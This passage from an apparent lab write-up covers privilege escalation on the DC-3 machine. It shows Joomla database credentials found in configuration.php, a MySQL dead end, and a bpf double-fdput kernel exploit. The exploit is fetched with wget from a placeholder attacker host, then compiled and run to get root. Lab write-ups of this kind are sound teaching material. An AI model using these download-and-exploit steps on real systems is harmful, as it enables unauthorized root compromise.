# Privilege Escalation
After gaining an initial foothold as the low-privileged `www-data` user, local enumeration was performed to identify possible privilege escalation vectors.

## Local Enumeration
`python3 -c "import pty;pty.spawn('/bin/bash')"` was used to spawn an interactive TTY after checking the python version using `python --version`.

The kernel version was identified:
```bash
uname -a
```
`Linux dc-3 4.4.0-21-generic #37-Ubuntu SMP x86_64 GNU/Linux` which is an outdated exploitable version; however, due to the unstable nature of kernel exploits this will be put off for now.

Further enumeration revealed:
- `/etc/passwd` contained only `root`, `dc3`, and `www-data`
- `/etc/shadow` was not readable
- No exploitable SUID binaries were found
- No Linux exploitable capabilities were set
- No exploitable environment variables were identified

These findings ruled out common user-based privilege escalation techniques.


## Credential Discovery
During filesystem enumeration, credentials were discovered in `Joomla`’s `configuration.php` file:

- `public $user = 'root';`
- `public $password = 'squires';`


Credential reuse was tested locally on both previously found passwords:
```bash
su root
su dc3
```
Both attempts failed, confirming that the credentials were not reused at the operating system level.


## Database Escalation Dead End
The discovered credentials allowed authentication as the MySQL root user. Database-based escalation was explored but found to be limited.

The secure file privilege setting was checked:
```sql
SELECT @@GLOBAL.secure_file_priv;
```

This restricted file operations to:
```
/var/lib/mysql-files
```

Since the `www-data` user could not interact with this directory to escalate privileges, database escalation was considered a dead end.


## Kernel Exploitation
With all standard privilege escalation paths exhausted, kernel-based privilege escalation was selected as the remaining viable option.

An initial kernel exploit attempt targeting Linux kernel versions below `4.4.0-21` failed due to missing kernel modules. A second exploit targeting the **double-fdput() vulnerability** was then selected:

```
Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() bpf(BPF_PROG_LOAD) Privilege Escalation
```

The exploit was transferred to the target system using a python webserver:

On the attacking machine:
```bash
python3 -m http.server 9000
```

On the target machine:
```bash
cd /tmp
wget http://<attacker ip>:9000/exploit.tar
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit
```

The exploit was compiled and executed:
```bash
./compile.sh
./doubleput
```
Successful execution of the exploit resulted in a root shell.
```bash
whoami
root
```

This marked full system compromise.
